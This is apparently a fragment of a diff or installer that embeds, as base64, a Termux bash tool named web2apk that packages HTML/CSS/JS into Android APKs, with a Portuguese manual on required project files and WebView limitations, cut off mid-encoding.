KUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApfdHBsX2JsYW5rKCkgewogIGxvY2FsIEQ9IiQxIgogIGNhdCA+ICIkRC9pbmRleC5odG1sIiA8PCAnSFRNTCcKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InB0LUJSIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIj4KICA8dGl0bGU+TWV1IEFwcDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzdHlsZS5jc3MiPgo8L2hlYWQ+Cjxib2R5PgoKICA8IS0tIFNldSBjb250ZcO6ZG8gYXF1aSAtLT4KCiAgPHNjcmlwdCBzcmM9InNjcmlwdC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgpIVE1MCgogIGNhdCA+ICIkRC9zdHlsZS5jc3MiIDw8ICdDU1MnCi8qIFJlc2V0ICovCiogeyBib3gtc2l6aW5nOiBib3JkZXItYm94OyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7IH0KCmJvZHkgewogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgYmFja2dyb3VuZDogI2ZmZmZmZjsKICBjb2xvcjogIzExMTExMTsKICBtaW4taGVpZ2h0OiAxMDB2aDsKfQpDU1MKCiAgcHJpbnRmICcvLyBzY3JpcHQuanNcbiJ1c2Ugc3RyaWN0IjtcblxuLy8gU2V1IGPDs2RpZ28gYXF1aVxuJyA+ICIkRC9zY3JpcHQuanMiCn0KCgpfY21kX21hbigpIHsKICBsb2NhbCBSPSdcMDMzWzE7MzFtJyBHPSdcMDMzWzE7MzJtJyBZPSdcMDMzWzE7MzNtJwogIGxvY2FsIEM9J1wwMzNbMTszNm0nIFc9J1wwMzNbMTszN20nIEQ9J1wwMzNbMDs5MG0nIE49J1wwMzNbMG0nCiAgcHJpbnRmICJcbiR7V33ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcke059XG4iCiAgcHJpbnRmICIke1d94pWRICAgICAgICB3ZWIyYXBrIOKAlCBNYW51YWw6IE8gcXVlIGNhZGEgYXJxdWl2byBkZXZlIHRlciAgICAgICAgIOKVkSR7Tn1cbiIKICBwcmludGYgIiR7V33ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0ke059XG5cbiIKCiAgcHJpbnRmICIke1l9RVNUUlVUVVJBIE3DjU5JTUEgRE8gUFJPSkVUTyR7Tn1cbiIKICBwcmludGYgIiR7RH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAke059XG4iCiAgcHJpbnRmICIgICR7WX0uL21ldWFwcC8ke059XG4iCiAgcHJpbnRmICIgICR7WX3ilJzilIDilIAgaW5kZXguaHRtbCR7Tn0gICAke0R94oaQIHBvbnRvIGRlIGVudHJhZGEgb2JyaWdhdMOzcmlvJHtOfVxuIgogIHByaW50ZiAiICAke1l94pSc4pSA4pSAIHN0eWxlLmNzcyR7Tn0gICAgJHtEfeKGkCBlc3RpbG9zIG9icmlnYXTDs3Jpb3Mke059XG4iCiAgcHJpbnRmICIgICR7WX3ilJTilIDilIAgc2NyaXB0LmpzJHtOfSAgICAke0R94oaQIGzDs2dpY2Egb2JyaWdhdMOzcmlhJHtOfVxuXG4iCgogICMg4pSA4pSAIGluZGV4Lmh0bWwg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgcHJpbnRmICIke0N94pSB4pSB4pSBICBpbmRleC5odG1sICDilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEke059XG5cbiIKICBwcmludGYgIiAgJHtXfU9CUklHQVTDk1JJTzoke059XG4iCiAgcHJpbnRmICIgICR7R33inJMke059IFByaW1laXJhIGxpbmhhOiAke0R9PCFET0NUWVBFIGh0bWw+JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBObyA8aGVhZD46ICR7RH08bWV0YSBjaGFyc2V0PVwiVVRGLThcIj4ke059XG4iCiAgcHJpbnRmICIgICR7R33inJMke059IE5vIDxoZWFkPjogJHtEfTxtZXRhIG5hbWU9XCJ2aWV3cG9ydFwiIGNvbnRlbnQ9XCJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wXCI+JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBObyA8aGVhZD46ICR7RH08bGluayByZWw9XCJzdHlsZXNoZWV0XCIgaHJlZj1cInN0eWxlLmNzc1wiPiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gQW50ZXMgZGUgPC9ib2R5PjogJHtEfTxzY3JpcHQgc3JjPVwic2NyaXB0LmpzXCI+PC9zY3JpcHQ+JHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31BVEVOw4fDg08g4oCUIHZpZXdwb3J0OiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfVNlbSBlc3NhIHRhZyBvIEFQSyByZW5kZXJpemEgZW0gbW9kbyBkZXNrdG9wIGUgZmljYSBtaW7DunNjdWxvLiR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9QVRFTsOHw4NPIOKAlCBwb3Npw6fDo28gZG8gPHNjcmlwdD46JHtOfVxuIgogIHByaW50ZiAiICAke0R9Q29sb3F1ZSBTRU1QUkUgYW50ZXMgZGUgPC9ib2R5PiwgbnVuY2Egbm8gPGhlYWQ+LiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfVNlIGNvbG9jYXIgbm8gPGhlYWQ+LCBvIEpTIHJvZGEgYW50ZXMgZG9zIGVsZW1lbnRvcyBleGlzdGlyZW0uJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31DQU1JTkhPUyBERSBBUlFVSVZPUzoke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH08aW1nIHNyYz1cIi9ob21lL3VzZXIvZm90by5wbmdcIj4gIOKGkCBjYW1pbmhvIGFic29sdXRvLCBOw4NPIGZ1bmNpb25hJHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSAke0R9PGltZyBzcmM9XCJmb3RvLnBuZ1wiPiAgICAgICAgICAgICDihpAgY2FtaW5obyByZWxhdGl2bywgY29ycmV0byR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9RVhFTVBMTyBNw41OSU1PIFbDgUxJRE86JHtOfVxuIgogIHByaW50ZiAiJHtEfSAgPCFET0NUWVBFIGh0bWw+XG4iCiAgcHJpbnRmICIgIDxodG1sIGxhbmc9XCJwdC1CUlwiPlxuIgogIHByaW50ZiAiICA8aGVhZD5cbiIKICBwcmludGYgIiAgICA8bWV0YSBjaGFyc2V0PVwiVVRGLThcIj5cbiIKICBwcmludGYgIiAgICA8bWV0YSBuYW1lPVwidmlld3BvcnRcIiBjb250ZW50PVwid2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMFwiPlxuIgogIHByaW50ZiAiICAgIDx0aXRsZT5NZXUgQXBwPC90aXRsZT5cbiIKICBwcmludGYgIiAgICA8bGluayByZWw9XCJzdHlsZXNoZWV0XCIgaHJlZj1cInN0eWxlLmNzc1wiPlxuIgogIHByaW50ZiAiICA8L2hlYWQ+XG4iCiAgcHJpbnRmICIgIDxib2R5PlxuIgogIHByaW50ZiAiICAgIDxoMT5PbMOhITwvaDE+XG4iCiAgcHJpbnRmICIgICAgPHNjcmlwdCBzcmM9XCJzY3JpcHQuanNcIj48L3NjcmlwdD5cbiIKICBwcmludGYgIiAgPC9ib2R5PlxuIgogIHByaW50ZiAiICA8L2h0bWw+XG4ke059XG4iCgogICMg4pSA4pSAIHN0eWxlLmNzcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBwcmludGYgIiR7Q33ilIHilIHilIEgIHN0eWxlLmNzcyAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31PQlJJR0FUw5NSSU86JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBSZXNldCBkZSBtYXJnZW06ICR7RH0qIHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyBib3gtc2l6aW5nOiBib3JkZXItYm94OyB9JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBUYW1hbmhvIGJhc2U6ICR7RH1ib2R5IHsgd2lkdGg6IDEwMHZ3OyBtaW4taGVpZ2h0OiAxMDB2aDsgfSR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9UkVDT01FTkRBRE8gcGFyYSBBbmRyb2lkOiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gRm9udGVzIGVtICR7RH1yZW0ke059IG91ICR7RH12dyR7Tn0sIG7Do28gZW0gJHtEfXB4JHtOfSBmaXhvXG4iCiAgcHJpbnRmICIgICR7R33inJMke059IEJvdMO1ZXMgY29tIG3DrW5pbW8gZGUgJHtEfTQ4cHgke059IGRlIGFsdHVyYSAow6FyZWEgdG9jw6F2ZWwpXG4iCiAgcHJpbnRmICIgICR7R33inJMke059ICR7RH1vdmVyZmxvdy14OiBoaWRkZW4ke059IG5vIGJvZHkgcGFyYSBldml0YXIgc2Nyb2xsIGxhdGVyYWxcblxuIgogIHByaW50ZiAiICAke1d9RVZJVEU6JHtOfVxuIgogIHByaW50ZiAiICAke1J94pyXJHtOfSAke0R9QGltcG9ydCB1cmwoaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS8uLi4pJHtOfSAg4oaQIHNlbSBpbnRlcm5ldCBubyBBUEtcbiIKICBwcmludGYgIiAgJHtSfeKclyR7Tn0gSW1hZ2VucyBkZSBmdW5kbyB2aWEgVVJMIGV4dGVybmFcbiIKICBwcmludGYgIiAgJHtSfeKclyR7Tn0gJHtEfXBvc2l0aW9uOiBmaXhlZCR7Tn0gY29tIGRpbWVuc8O1ZXMgaGFyZGNvZGVkXG5cbiIKICBwcmludGYgIiAgJHtXfUZPTlRFUyBMT0NBSVMgKGNvcnJldG8pOiR7Tn1cbiIKICBwcmludGYgIiR7RH0gIEBmb250LWZhY2Uge1xuIgogIHByaW50ZiAiICAgIGZvbnQtZmFtaWx5OiAnTWluaGFGb250ZSc7XG4iCiAgcHJpbnRmICIgICAgc3JjOiB1cmwoJ21pbmhhLWZvbnRlLnR0ZicpO1xuIgogIHByaW50ZiAiICB9XG4ke059XG4iCgogICMg4pSA4pSAIHNjcmlwdC5qcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBwcmludGYgIiR7Q33ilIHilIHilIEgIHNjcmlwdC5qcyAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31PQlJJR0FUw5NSSU86JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBTZSBvIDxzY3JpcHQ+IGZvciBubyA8aGVhZD4sIGVudm9sdmEgdHVkbyBjb206XG4iCiAgcHJpbnRmICIke0R9ICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7XG4iCiAgcHJpbnRmICIgICAgLy8gc2V1IGPDs2RpZ28gYXF1aVxuIgogIHByaW50ZiAiICB9KTtcbiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfShTZSBvIDxzY3JpcHQ+IGVzdGl2ZXIgYW50ZXMgZGUgPC9ib2R5PiwgaXNzbyBuw6NvIMOpIG5lY2Vzc8OhcmlvLikke059XG5cbiIKICBwcmludGYgIiAgJHtXfU8gUVVFIEZVTkNJT05BIG5vIFdlYlZpZXcgZG8gQVBLOiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gTWFuaXB1bGHDp8OjbyBkZSBET00sIGV2ZW50b3MsIGFuaW1hw6fDtWVzIENTU1xuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBDYW52YXMgMkQgZSBXZWJHTCBiw6FzaWNvXG4iCiAgcHJpbnRmICIgICR7R33inJMke059ICR7RH1uZXcgQXVkaW8oJ2FycXVpdm8ubXAzJykke059IOKAlCBzZSBvIC5tcDMgZXN0aXZlciBuYSBwYXN0YVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSAke0R9c2Vzc2lvblN0b3JhZ2Uke059IGUgdmFyacOhdmVpcyBnbG9iYWlzIEpTXG4iCiAgcHJpbnRmICIgICR7R33inJMke059IEJpYmxpb3RlY2FzIEpTIGxvY2FpcyAoYXJxdWl2byAuanMgbmEgcGFzdGEsIGltcG9ydGFkbyByZWxhdGl2bylcblxuIgogIHByaW50ZiAiICAke1d9TyBRVUUgTsODTyBGVU5DSU9OQToke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH1mZXRjaCgnaHR0cHM6Ly9hcGkuZXh0ZXJuYS5jb20nKSR7Tn0gIOKGkCBDT1JTIGJsb3F1ZWFkbyBubyBXZWJWaWV3XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH1uYXZpZ2F0b3IuZ2VvbG9jYXRpb24ke059ICAgICAgICAgICAgICDihpAgcHJlY2lzYSBkZSBwZXJtaXNzw6NvIG5hdGl2YVxuIgogIHByaW50ZiAiICAke1J94pyXJHtOfSAke0R9PHNjcmlwdCBzcmM9XCJodHRwczovL2Nkbi5leGVtcGxvLmNvbS9saWIuanNcIj4ke059ICDihpAgc2VtIGludGVybmV0XG5cbiIKICBwcmludGYgIiAgJHtXfUJJQkxJT1RFQ0FTIEVYVEVSTkFTIOKAlCBmYcOnYSBhc3NpbToke059XG4iCiAgcHJpbnRmICIgICR7RH1CYWl4ZSBvIC5qcyBlIGNvbG9xdWUgbmEgcGFzdGEgZG8gcHJvamV0bzoke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH08c2NyaXB0IHNyYz1cImh0dHBzOi8vY2RuLmpxdWVyeS5jb20vanF1ZXJ5Lm1pbi5qc1wiPiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gJHtEfTxzY3JpcHQgc3JjPVwianF1ZXJ5Lm1pbi5qc1wiPiR7Tn1cblxuIgoKICAjIOKUgOKUgCBBcnF1aXZvcyBleHRyYXMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgcHJpbnRmICIke0N94pSB4pSB4pSBICBBUlFVSVZPUyBPUENJT05BSVMgIOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9SW1hZ2Vuczoke059ICAucG5nIC5qcGcgLmdpZiAud2VicCAuc3ZnXG4iCiAgcHJpbnRmICIgICR7V33DgXVkaW86JHtOfSAgICAubXAzIC5vZ2cgLndhdlxuIgogIHByaW50ZiAiICAke1d9Rm9udGVzOiR7Tn0gICAudHRmIC53b2ZmIC53b2ZmMiAgJHtEfSh1c2UgQGZvbnQtZmFjZSBsb2NhbCkke059XG4iCiAgcHJpbnRmICIgICR7V31KU09OOiR7Tn0gICAgIC5qc29uICAke0R9KHZpYSBmZXRjaCgnLi9kYWRvcy5qc29uJykpJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31TdWJwYXN0YXMgZnVuY2lvbmFtIG5vcm1hbG1lbnRlOiR7Tn1cbiIKICBwcmludGYgIiAgJHtZfSAgLi9tZXVhcHAvYXNzZXRzL2xvZ28ucG5nJHtOfSAg4oaSICAke0R9PGltZyBzcmM9XCJhc3NldHMvbG9nby5wbmdcIj4ke059XG5cbiIKCiAgIyDilIDilIAgRXJyb3MgY29tdW5zIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIHByaW50ZiAiJHtDfeKUgeKUgeKUgSAgRVJST1MgQ09NVU5TICDilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEke059XG5cbiIKICBwcmludGYgIiAgJHtSfVRlbGEgYnJhbmNhIG5vIEFQSyR7Tn1cbiIKICBwcmludGYgIiAgJHtEfeKGkiBWZXJpZmlxdWUgc2UgbyA8c2NyaXB0PiBlc3TDoSBhbnRlcyBkZSA8L2JvZHk+JHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEFicmEgbyBpbmRleC5odG1sIG5vIGJyb3dzZXIgZSB2ZWphIG8gY29uc29sZSBkZSBlcnJvcyR7Tn1cblxuIgogIHByaW50ZiAiICAke1J9TGF5b3V0IHF1ZWJyYWRvIC8gdGVsYSBtaW7DunNjdWxhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEZhbHRvdSBhIG1ldGEgdmlld3BvcnQgbm8gPGhlYWQ+JHtOfVxuXG4iCiAgcHJpbnRmICIgICR7Un1JbWFnZW5zIG7Do28gYXBhcmVjZW0ke059XG4iCiAgcHJpbnRmICIgICR7RH3ihpIgVXNlIGNhbWluaG8gcmVsYXRpdm8gZSBjb25maXJtZSBxdWUgbyBhcnF1aXZvIGVzdMOhIG5hIHBhc3RhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIE5vbWVzIGRlIGFycXVpdm8gc8OjbyBjYXNlLXNlbnNpdGl2ZSBubyBBbmRyb2lkJHtOfVxuIgogIHByaW50ZiAiICAke0R9ICBleDogJ0xvZ28uUE5HJyDiiaAgJ2xvZ28ucG5nJyR7Tn1cblxuIgogIHByaW50ZiAiICAke1J9Rm9udGUgbsOjbyBjYXJyZWdhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEJhaXhlIG8gLnR0ZiBlIHVzZSBAZm9udC1mYWNlIGxvY2FsIChzZW0gR29vZ2xlIEZvbnRzIG9ubGluZSkke059XG5cbiIKICBwcmludGYgIiR7RH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAke059XG4iCiAgcHJpbnRmICIgIETDunZpZGFzIHNvYnJlIG9ww6fDtWVzIGRvIGNvbWFuZG8/ICAke1d9d2ViMmFwayBoZWxwJHtOfVxuIgogIHByaW50ZiAiJHtEfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCR7Tn1cblxuIgp9CmNhc2UgIiR7MTotaGVscH0iIGluCiAgYnVpbGQpICAgIHNoaWZ0OyBfY21kX2J1aWxkICAgICIkQCIgOzsKICB0ZW1wbGF0ZSkgc2hpZnQ7IF9jbWRfdGVtcGxhdGUgIiRAIiA7OwogIGNoZWNrKSAgICBfY21kX2NoZWNrIDs7CiAgbWFufC0tbWFuKSAgICAgIF9jbWRfbWFuICA7OwogIGhlbHB8LS1oZWxwfC1oKSBfY21kX2hlbHAgOzsKICAqKSBpZiBbIC1kICIkMSIgXSB8fCBbICIkMSIgPSAnLS11cmwnIF07IHRoZW4gX2NtZF9idWlsZCAiJEAiOyBlbHNlIF9jbWRfaGVscDsgZmkgOzsKZXNhYwo='
+script_b64 = 'IyEvdXNyL2Jpbi9lbnYgYmFzaAojIHdlYjJhcGsgLS0gRWxsaW90T1MgSFRNTC9DU1MvSlMgLT4gQVBLClZFUlNJT049JzEuMS4wJwpQUkVGSVg9IiR7UFJFRklYOi0vZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyfSIKVzJBX0hPTUU9IiRIT01FLy54cG0vd2ViMmFwayIKVzJBX0pBUj0iJFcyQV9IT01FL2FuZHJvaWQuamFyIgpXMkFfS1M9IiRIT01FLy54cG0vdG9vbHMvYXBrdG9vbC94cG0tY29tcGF0LXRlc3Qua2V5c3RvcmUiClsgLWYgIiRXMkFfS1MiIF0gfHwgVzJBX0tTPSIkVzJBX0hPTUUvd2ViMmFway5rZXlzdG9yZSIKX29rKCkgICB7IHByaW50ZiAnXDAzM1sxOzMybSAgb2sgJXNcMDMzWzBtXG4nICAiJDEiOyB9Cl9pbmZvKCkgeyBwcmludGYgJ1wwMzNbMTszNm0gIC0+ICVzXDAzM1swbVxuJyAgIiQxIjsgfQpfd2FybigpIHsgcHJpbnRmICdcMDMzWzE7MzNtICAhICAlc1wwMzNbMG1cbicgICIkMSI7IH0KX2VycigpICB7IHByaW50ZiAnXDAzM1sxOzMxbSAgWCAgJXNcMDMzWzBtXG4nICIkMSIgPiYyOyBleGl0IDE7IH0KX2hlYWQoKSB7IHByaW50ZiAnXG5cMDMzWzE7MzVtICA9PSAlcyA9PVwwMzNbMG1cbicgIiQxIjsgfQpfZGltKCkgIHsgcHJpbnRmICdcMDMzWzA7OTBtICAlc1wwMzNbMG1cbicgIiQxIjsgfQpfcGVybV9yZXNvbHZlKCkgewogIGxvY2FsIHAKICBmb3IgcCBpbiAkKHByaW50ZiAnJXMnICIkMSIgfCB0ciAnLCcgJyAnKTsgZG8KICAgIGNhc2UgIiQocHJpbnRmICclcycgIiRwIiB8IHRyICdBLVonICdhLXonIHwgdHIgLWQgJyAnKSIgaW4KICAgICAgaW50ZXJuZXR8bmV0fG5ldHdvcmspICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5JTlRFUk5FVCcgOzsKICAgICAgY2FtZXJhfHdlYmNhbXxjYW0pICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5DQU1FUkEnIDs7CiAgICAgIG1pY3xtaWNyb3Bob25lfGF1ZGlvfHJlY29yZCkgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ09SRF9BVURJTycgOzsKICAgICAgc3RvcmFnZXxhcmNoaXZlc3xmaWxlc3xzZGNhcmQpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTUFOQUdFX0VYVEVSTkFMX1NUT1JBR0UnIDs7CiAgICAgIGxvY2F0aW9ufGdwc3xnZW8pCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkFDQ0VTU19GSU5FX0xPQ0FUSU9OJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5BQ0NFU1NfQ09BUlNFX0xPQ0FUSU9OJyA7OwogICAgICB2aWJyYXRlfHZpYnJhdGlvbikgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlZJQlJBVEUnIDs7CiAgICAgIGJsdWV0b290aHxidCkKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5CTFVFVE9PVEhfQ09OTkVDVCcKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIX1NDQU4nIDs7CiAgICAgIG5mYykgICAgICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTkZDJyA7OwogICAgICBjb250YWN0cykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUkVBRF9DT05UQUNUUycKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfQ09OVEFDVFMnIDs7CiAgICAgIHBob25lfGNhbGwpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkNBTExfUEhPTkUnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfUEhPTkVfU1RBVEUnIDs7CiAgICAgIHNtcykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uU0VORF9TTVMnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ0VJVkVfU01TJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5SRUFEX1NNUycgOzsKICAgICAgd2FrZXx3YWtlbG9jaykgICAgICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5XQUtFX0xPQ0snIDs7CiAgICAgIG5vdGlmaWNhdGlvbnN8bm90aWYpICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUE9TVF9OT1RJRklDQVRJT05TJyA7OwogICAgICBmbGFzaGxpZ2h0fHRvcmNoKSAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkZMQVNITElHSFQnIDs7CiAgICAgIHNlbnNvcnMpICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLn